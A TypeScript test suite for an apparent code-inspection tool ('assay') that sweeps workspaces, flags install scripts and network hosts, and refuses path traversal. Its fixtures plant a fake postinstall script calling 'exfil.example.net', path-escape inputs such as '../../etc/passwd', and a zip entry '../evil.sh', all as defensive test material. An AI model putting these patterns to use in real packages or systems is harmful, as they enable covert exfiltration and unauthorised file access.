import assert from "node:assert/strict";
import { cpSync, mkdirSync, symlinkSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { test } from "node:test";
import { writeFixtures } from "../bench/tasks/make-fixtures.ts";
import type { ProbeDef } from "../src/contracts.ts";
import { isAssayError } from "../src/errors.ts";
import type { Json } from "../src/evidence/jcs.ts";
import { probeKey, subjectDigest } from "../src/evidence/record.ts";
import { caseEvidence, getEvidence } from "../src/evidence/store.ts";
import { Kernel } from "../src/kernel/kernel.ts";
import { BUILTIN_PROBES } from "../src/probes/builtin/index.ts";
import { diffFindings } from "../src/probes/diff.ts";
import { createProbeEngine } from "../src/probes/engine.ts";
import { loadRouterPack, matchRows, toolStatus, validatePack, which } from "../src/probes/router.ts";
import { fixtureSet } from "./fixtures/probes/gen.ts";
import { fixtureWorkspace, writeFiles } from "./fixtures/probes/harness.ts";
import { FakeClock, openTemp, tmp } from "./helpers.ts";

const enc = new TextEncoder();

function probe(over: Partial<ProbeDef> & { run: ProbeDef["run"] }): ProbeDef {
  return {
    id: "test.probe",
    version: "1",
    predicate: "test.probe",
    summary: "test",
    appliesTo: () => true,
    platforms: ["linux", "darwin", "win32"],
    cost: "cheap",
    ...over,
  };
}

function setup(extra: ProbeDef[] = [], opts: Record<string, unknown> = {}) {
  const store = openTemp(new FakeClock());
  const ws = tmp("assay-ws-");
  const outside = tmp("assay-out-");
  writeFiles(ws.dir, [
    { rel: "a.txt", bytes: "hello" },
    { rel: "pkg/package.json", bytes: '{"name":"p","version":"1.0.0","scripts":{"postinstall":"node x.js"}}' },
    { rel: "pkg/x.js", bytes: 'require("https").get("https://exfil.example.net/x")' },
    { rel: "pkg/node_modules/dep/index.js", bytes: "1" },
  ]);
  writeFileSync(join(outside.dir, "secret.txt"), "top secret");
  const engine = createProbeEngine({ kernel: store.k, workspace: ws.dir, probes: extra, which: () => null, ...opts });
  return {
    k: store.k,
    ws: ws.dir,
    outside: outside.dir,
    engine,
    cleanup: () => {
      store.cleanup();
      ws.cleanup();
      outside.cleanup();
    },
  };
}

test("path guard: .., absolute paths and symlinks that leave the workspace are refused", async () => {
  const s = setup();
  try {
    symlinkSync(join(s.outside, "secret.txt"), join(s.ws, "link-out"));
    symlinkSync(s.outside, join(s.ws, "dir-out"));
    symlinkSync(join(s.ws, "a.txt"), join(s.ws, "link-in"));
    for (const p of [
      "../x",
      "../../etc/passwd",
      join(s.outside, "secret.txt"),
      "link-out",
      "dir-out/secret.txt",
      "dir-out",
    ])
      await assert.rejects(
        s.engine.run({ caseId: null, probeId: "file.hash", path: p }),
        (e) => isAssayError(e, "path_outside_workspace"),
        p,
      );
    await assert.rejects(s.engine.run({ caseId: null, probeId: "file.hash", path: "nope.txt" }), (e) =>
      isAssayError(e, "path_not_found"),
    );
    const viaLink = await s.engine.run({ caseId: null, probeId: "file.hash", path: "link-in" });
    assert.equal(viaLink.locator?.path, "a.txt");
    const abs = await s.engine.run({ caseId: null, probeId: "file.hash", path: join(s.ws, "a.txt") });
    assert.equal(abs.observation_id, viaLink.observation_id);
  } finally {
    s.cleanup();
  }
});

test("ctx.read on a directory subject cannot climb out, even through a symlink", async () => {
  const reads: string[] = [];
  const climber = probe({
    id: "test.climb",
    async run(ctx) {
      for (const rel of ["../a.txt", "esc/secret.txt"]) {
        try {
          await ctx.read(rel);
          reads.push(`${rel}:read`);
        } catch (e) {
          reads.push(`${rel}:${(e as { code?: string }).code}`);
        }
      }
      return { result: { ok: true } };
    },
  });
  const s = setup([climber]);
  try {
    symlinkSync(s.outside, join(s.ws, "pkg", "esc"));
    await s.engine.run({ caseId: null, probeId: "test.climb", path: "pkg" });
    assert.deepEqual(reads, ["../a.txt:path_outside_workspace", "esc/secret.txt:path_outside_workspace"]);
  } finally {
    s.cleanup();
  }
});

test("digests: files are sha256 of bytes; directories are equal for equal trees and change with content", () => {
  const s = setup();
  try {
    assert.equal(s.engine.resolve("a.txt").digest, subjectDigest(enc.encode("hello")));
    cpSync(join(s.ws, "pkg"), join(s.ws, "copy"), { recursive: true });
    const d1 = s.engine.resolve("pkg").digest;
    assert.equal(s.engine.resolve("copy").digest, d1);
    writeFileSync(join(s.ws, "copy", "x.js"), "changed");
    assert.notEqual(s.engine.resolve("copy").digest, d1);
    // node_modules is outside what the probes examine, so it is not digested
    writeFileSync(join(s.ws, "pkg", "node_modules", "dep", "index.js"), "2");
    assert.equal(s.engine.resolve("pkg").digest, d1);
  } finally {
    s.cleanup();
  }
});

test("the ProbeKey is computed before running; known keys reuse evidence and link it to the case", async () => {
  let runs = 0;
  const counting = probe({
    id: "test.count",
    async run(ctx) {
      runs++;
      return { result: { size: ctx.subject.size, params: ctx.params } };
    },
  });
  const s = setup([counting]);
  try {
    const a = await s.engine.run({ caseId: null, probeId: "test.count", path: "a.txt", params: { n: 1 } });
    assert.equal(
      a.probe_key,
      probeKey({ id: "test.count", version: "1" }, { n: 1 }, subjectDigest(enc.encode("hello"))),
    );
    const b = await s.engine.run({ caseId: "case_1", probeId: "test.count", path: "a.txt", params: { n: 1 } });
    assert.equal(runs, 1);
    assert.equal(b.observation_id, a.observation_id);
    assert.deepEqual(
      caseEvidence(s.k, "case_1").map((r) => r.observation_id),
      [a.observation_id],
    );
    await s.engine.run({ caseId: null, probeId: "test.count", path: "a.txt", params: { n: 2 } });
    assert.equal(runs, 2);
  } finally {
    s.cleanup();
  }
});

test("timeouts, cancellation and raw exceptions all surface as probe_failed with a reason", async () => {
  const hang = probe({ id: "test.hang", run: () => new Promise(() => {}) });
  const boom = probe({
    id: "test.boom",
    async run() {
      throw new TypeError("x is not a function");
    },
  });
  const empty = probe({ id: "test.empty", run: async () => ({}) as never });
  const ac = new AbortController();
  const s = setup([hang, boom, empty], { timeoutMs: 50, signal: ac.signal });
  try {
    await assert.rejects(s.engine.run({ caseId: null, probeId: "test.hang", path: "a.txt" }), (e) => {
      assert.ok(isAssayError(e, "probe_failed"));
      assert.match(String(e.detail?.reason), /timed out after 50 ms/);
      return true;
    });
    await assert.rejects(s.engine.run({ caseId: null, probeId: "test.boom", path: "a.txt" }), (e) => {
      assert.ok(isAssayError(e, "probe_failed"));
      assert.match(String(e.detail?.reason), /internal error: TypeError: x is not a function/);
      return true;
    });
    await assert.rejects(s.engine.run({ caseId: null, probeId: "test.empty", path: "a.txt" }), (e) =>
      isAssayError(e, "probe_failed"),
    );
    const p = s.engine.run({ caseId: null, probeId: "test.hang", path: "a.txt" });
    ac.abort();
    await assert.rejects(p, (e) => isAssayError(e, "probe_failed") && /cancelled/.test(String(e.detail?.reason)));
    await assert.rejects(s.engine.run({ caseId: null, probeId: "no.such", path: "a.txt" }), (e) =>
      isAssayError(e, "probe_unknown"),
    );
    await assert.rejects(
      s.engine.run({ caseId: null, probeId: "elf.info", path: "a.txt" }),
      (e) => isAssayError(e, "probe_failed") && /does not apply/.test(String(e.detail?.reason)),
    );
    await assert.rejects(
      s.engine.run({ caseId: null, probeId: "file.contains", path: "a.txt", params: { text: "/etc/passwd" } }),
      (e) => isAssayError(e, "bad_request"),
    );
  } finally {
    s.cleanup();
  }
});

test("records: runner producer, locator, volatile, taint, per-probe confidence, injected redaction", async () => {
  const redact = (v: Json) => {
    const redactions: { pointer: string; fingerprint: string; kind: string }[] = [];
    const walk = (x: Json, ptr: string): Json => {
      if (typeof x === "string" && x.includes("exfil")) {
        redactions.push({ pointer: ptr, fingerprint: "fp_test", kind: "host" });
        return "[redacted]";
      }
      if (Array.isArray(x)) return x.map((y, i) => walk(y, `${ptr}/${i}`));
      if (x && typeof x === "object")
        return Object.fromEntries(Object.entries(x).map(([k, y]) => [k, walk(y, `${ptr}/${k}`)]));
      return x;
    };
    return { value: walk(v, ""), redactions };
  };
  const s = setup([], { redact, platform: "linux" });
  try {
    const id = await s.engine.run({ caseId: null, probeId: "file.identify", path: "a.txt" });
    assert.deepEqual(id.producer, { kind: "runner", id: "assay-runner" });
    assert.equal(id.confidence, "observed");
    assert.equal(id.taint, "target");
    assert.equal(id.locator?.path, "a.txt");
    assert.equal((id.volatile as { platform: string }).platform, "linux");
    assert.equal(typeof (id.volatile as { ms: number }).ms, "number");
    assert.equal(id.subject?.format, "text");
    const inv = await s.engine.run({ caseId: null, probeId: "dir.inventory", path: "pkg" });
    assert.equal(inv.confidence, "derived");
    assert.equal(inv.coverage?.status, "partial");
    const ep = await s.engine.run({ caseId: null, probeId: "js.endpoints", path: "pkg/x.js" });
    assert.equal(JSON.stringify(ep.result).includes("exfil"), false);
    assert.ok(ep.redactions.length > 0);
    assert.equal(ep.redactions[0]!.kind, "host");
  } finally {
    s.cleanup();
  }
});

test("sweep: findings carry observation ids, notable findings become questions, skipped parts are listed", async () => {
  const s = setup();
  try {
    const r = await s.engine.sweep({ caseId: "case_s", path: "pkg" });
    assert.equal(r.subject, "pkg");
    assert.ok(r.elapsedMs >= 0);
    for (const f of r.findings) {
      assert.ok(r.evidence.includes(f.observation_id));
      assert.ok(getEvidence(s.k, f.observation_id));
    }
    assert.ok(r.findings.some((f) => f.class === "pkg.install-script"));
    assert.ok(r.findings.some((f) => f.class === "net.host" && f.label === "exfil.example.net"));
    assert.ok(r.questions.some((q) => q.includes("install script") && q.includes("postinstall")));
    assert.ok(r.questions.some((q) => q.includes("exfil.example.net")));
    assert.ok(r.notExamined.some((n) => n.what === "pkg/node_modules/" && /dependency/.test(n.reason)));
    assert.equal(caseEvidence(s.k, "case_s").length, r.evidence.length);
    const file = await s.engine.sweep({ caseId: null, path: "a.txt" });
    assert.ok(file.evidence.length >= 2, "identify and hash on a file root");
  } finally {
    s.cleanup();
  }
});

test("sweep of every fixture: identified correctly, expected probes ran, unsupported formats and missing tools listed", async () => {
  const w = fixtureWorkspace();
  const store = openTemp();
  try {
    // platform pinned: the expected notExamined reasons below are the Linux ones (readelf is Linux-only)
    const engine = createProbeEngine({ kernel: store.k, workspace: w.dir, which: () => null, platform: "linux" });
    for (const fx of w.fixtures) {
      const r = await engine.sweep({ caseId: null, path: fx.subject });
      const recs = r.evidence.map((id) => getEvidence(store.k, id)!);
      const own = recs.find((x) => x.predicate === "file.identify" && x.locator?.path === fx.subject);
      assert.equal((own?.result as { format?: string } | undefined)?.format, fx.format, fx.name);
      for (const p of fx.probes)
        assert.ok(
          recs.some((x) => x.probe?.id === p),
          `${fx.name}: ${p} did not run`,
        );
    }
    const all = await engine.sweep({ caseId: null, path: "." });
    assert.ok(
      all.notExamined.some(
        (n) => n.what === "data/app.db" && n.reason === "unsupported format: sqlite (identified only)",
      ),
    );
    assert.ok(
      all.notExamined.some((n) => n.reason === "tool missing" && n.what.startsWith("readelf -dW {path} [elf-pe]")),
    );
    assert.ok(all.questions.some((q) => q.includes("misc/blob.bin") && q.includes("not recognised")));
    assert.ok(all.questions.some((q) => q.includes("dist/bundle.zip") && q.includes("../evil.sh")));
    assert.ok(all.questions.some((q) => q.includes("native add-on")));
    const second = openTemp();
    try {
      const budget = await createProbeEngine({ kernel: second.k, workspace: w.dir }).sweep({
        caseId: null,
        path: ".",
        budgetMs: 0,
      });
      assert.ok(budget.notExamined.some((n) => /budget/.test(n.reason)));
    } finally {
      second.cleanup();
    }
  } finally {
    store.cleanup();
    w.cleanup();
  }
});

test("reproducibility (M8): two sweeps, and sweeps of two copies at different paths, give identical ids and keys", async () => {
  const fixtures = fixtureSet();
  const a = tmp("assay-repro-a-");
  const b = tmp("assay-repro-b-");
  writeFiles(
    join(a.dir, "one"),
    fixtures.flatMap((f) => f.files),
  );
  writeFiles(
    join(b.dir, "deeper", "two"),
    fixtures.flatMap((f) => f.files),
  );
  const s1 = openTemp();
  const s2 = openTemp();
  try {
    const e1 = createProbeEngine({ kernel: s1.k, workspace: a.dir, which: () => null });
    const e2 = createProbeEngine({ kernel: s2.k, workspace: b.dir, which: () => null });
    const keys = (k: Kernel, ids: string[]) =>
      ids
        .map((id) => getEvidence(k, id)!)
        .map((r) => `${r.probe_key}|${r.observation_id}`)
        .sort();
    const r1 = await e1.sweep({ caseId: null, path: "one" });
    const r1b = await e1.sweep({ caseId: null, path: "one" });
    const r2 = await e2.sweep({ caseId: null, path: "deeper/two" });
    assert.ok(r1.evidence.length > 60);
    assert.deepEqual(keys(s1.k, r1b.evidence), keys(s1.k, r1.evidence));
    assert.deepEqual(keys(s2.k, r2.evidence), keys(s1.k, r1.evidence));
    const fk = (r: typeof r1) => r.findings.map((f) => `${f.key}|${f.observation_id}`).sort();
    assert.deepEqual(fk(r2), fk(r1));
  } finally {
    s1.cleanup();
    s2.cleanup();
    a.cleanup();
    b.cleanup();
  }
});

test("re-assay: diffFindings pairs v1 and v2 findings by FindingKey", async () => {
  const w = tmp("assay-bench-");
  const store = openTemp();
  try {
    writeFixtures(w.dir);
    const engine = createProbeEngine({ kernel: store.k, workspace: w.dir, which: () => null });
    const v1 = await engine.sweep({ caseId: null, path: "version-pair/v1" });
    const v2 = await engine.sweep({ caseId: null, path: "version-pair/v2" });
    const d = diffFindings(v1.findings, v2.findings);
    const labels = (xs: { class: string; label: string }[]) => xs.map((f) => `${f.class}:${f.label}`);
    assert.ok(labels(d.added).includes("pkg.dependency:telemetry-lite@^0.3.0 (dependencies)"));
    assert.ok(labels(d.added).includes("net.host:metrics.newhost.example.io"));
    assert.ok(labels(d.added).includes("js.import:telemetry-lite (static-import)"));
    assert.deepEqual(d.removed, []);
    assert.ok(d.unchanged.some((u) => u.after.label === "api.stable.example.com"));
    assert.ok(d.unchanged.some((u) => u.after.label.startsWith("left-pad@")));
    const app = await engine.sweep({ caseId: null, path: "js-app/src" });
    assert.ok(app.questions.some((q) => q.startsWith("js-app/src/main.js loads code the census could not resolve")));
    assert.ok(app.findings.some((f) => f.class === "js.import" && f.label === "./worker.js (worker-url)"));
    const same = diffFindings(v1.findings, v1.findings);
    assert.equal(same.added.length + same.removed.length, 0);
  } finally {
    store.cleanup();
    w.cleanup();
  }
});

test("router pack: valid, every row credited to leanrea, probes exist, missing tools never run", async () => {
  const pack = loadRouterPack();
  assert.equal(pack.rows.length, 18);
  assert.deepEqual(validatePack(pack, new Set(BUILTIN_PROBES.map((p) => p.id))), []);
  const lines = pack.rows.map((r) => Number(r.source.split(":")[1]));
  assert.deepEqual(
    lines,
    Array.from({ length: 18 }, (_, i) => 38 + i),
  );
  assert.deepEqual(
    matchRows({ format: "elf", name: "x" }).map((r) => r.id),
    ["native-logic", "elf-pe"],
  );
  assert.ok(matchRows({ format: "elf", name: "x", markers: ["go-buildinfo"] }).some((r) => r.id === "go"));
  assert.ok(matchRows({ format: "elf", name: "lib/arm64-v8a/libapp.so" }).some((r) => r.id === "flutter"));
  assert.deepEqual(
    matchRows({ format: "unknown", name: "x.dat" }).map((r) => r.id),
    [],
  );
  assert.ok(matchRows({ format: "unknown", name: "fw.bin" }).some((r) => r.id === "firmware"));
  const row = pack.rows.find((r) => r.id === "macho")!;
  assert.equal(toolStatus(row, row.external[0]!, "linux", () => "/x").reason, "tool missing (lipo runs on darwin)");
  assert.equal(toolStatus(row, row.external[0]!, "darwin", () => null).reason, "tool missing");
  assert.equal(toolStatus(row, row.external[0]!, "darwin", () => "/usr/bin/lipo").available, true);
  assert.equal(which("definitely-not-a-program-xyz"), null);
  // an external probe whose tool is missing fails with "tool missing" instead of running
  const s = setup([], { platform: "linux" });
  try {
    writeFileSync(join(s.ws, "t.so"), fixtureSet().find((f) => f.name === "elf")!.files[0]!.bytes);
    await assert.rejects(
      s.engine.run({ caseId: null, probeId: "ext.elf-pe.readelf-d", path: "t.so" }),
      (e) => isAssayError(e, "probe_failed") && e.detail?.reason === "tool missing",
    );
  } finally {
    s.cleanup();
  }
});

test("router: an available external tool runs through ctx.exec when the sweep allows it", async (t) => {
  if (process.platform !== "linux" || !which("readelf")) {
    t.skip("readelf not on PATH");
    return;
  }
  const w = tmp("assay-ext-");
  const store = openTemp();
  try {
    mkdirSync(join(w.dir, "b"));
    writeFileSync(join(w.dir, "b", "t.so"), fixtureSet().find((f) => f.name === "elf")!.files[0]!.bytes);
    const engine = createProbeEngine({ kernel: store.k, workspace: w.dir, runExternal: true });
    const r = await engine.sweep({ caseId: null, path: "b/t.so" });
    const ext = r.evidence.map((id) => getEvidence(store.k, id)!).find((x) => x.probe?.id === "ext.elf-pe.readelf-d");
    assert.ok(ext, "readelf ran");
    const res = ext.result as { stdout: string; code: number };
    assert.equal(res.code, 0);
    assert.match(res.stdout, /\(NEEDED\)\s+Shared library: \[libssl\.so\.3\]/);
    assert.equal(res.stdout.includes(w.dir), false, "absolute paths are scrubbed from tool output");
  } finally {
    store.cleanup();
    w.cleanup();
  }
});

test("M10 perf: warm identify and sweep of each fixture take at most 1 s (median)", async (t) => {
  const w = fixtureWorkspace();
  try {
    const median = (xs: number[]) => [...xs].sort((a, b) => a - b)[Math.floor(xs.length / 2)]!;
    let worstId = 0;
    let worstSweep = 0;
    const rows: string[] = [];
    for (const fx of w.fixtures) {
      const idT: number[] = [];
      const swT: number[] = [];
      for (let i = 0; i < 4; i++) {
        const k = Kernel.open({ path: ":memory:" });
        const engine = createProbeEngine({ kernel: k, workspace: w.dir, which: () => null });
        let t0 = performance.now();
        await engine.run({ caseId: null, probeId: "file.identify", path: fx.subject });
        const a = performance.now() - t0;
        t0 = performance.now();
        await engine.sweep({ caseId: null, path: fx.subject });
        const b = performance.now() - t0;
        k.close();
        if (i > 0) {
          idT.push(a);
          swT.push(b);
        }
      }
      worstId = Math.max(worstId, median(idT));
      worstSweep = Math.max(worstSweep, median(swT));
      rows.push(`${fx.name}=${median(idT).toFixed(1)}/${median(swT).toFixed(1)}`);
    }
    t.diagnostic(`M10 identify-median-max=${worstId.toFixed(1)}ms sweep-median-max=${worstSweep.toFixed(1)}ms`);
    t.diagnostic(`M10 per-fixture identify/sweep ms: ${rows.join(" ")}`);
    assert.ok(worstId <= 1000);
    assert.ok(worstSweep <= 1000);
  } finally {
    w.cleanup();
  }
});
